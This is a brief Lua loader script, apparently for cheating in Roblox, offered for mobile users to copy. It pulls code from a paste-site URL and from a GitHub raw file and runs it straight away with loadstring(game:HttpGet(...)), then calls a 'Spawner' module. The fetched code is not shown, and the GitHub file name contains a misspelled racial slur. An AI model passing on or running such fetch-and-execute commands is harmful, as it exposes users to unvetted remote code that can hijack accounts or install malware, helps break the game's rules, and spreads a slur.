-- For Mobile Copy:
loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/ESD4aki9LCbIUAfF/raw", true))()
wait(1)
local Spawner = 
loadstring(game:HttpGet("https://raw.githubusercontent.com/iwantsom3/script/refs/heads/main/Niggggfd.lua"))()
Spawner.Load()
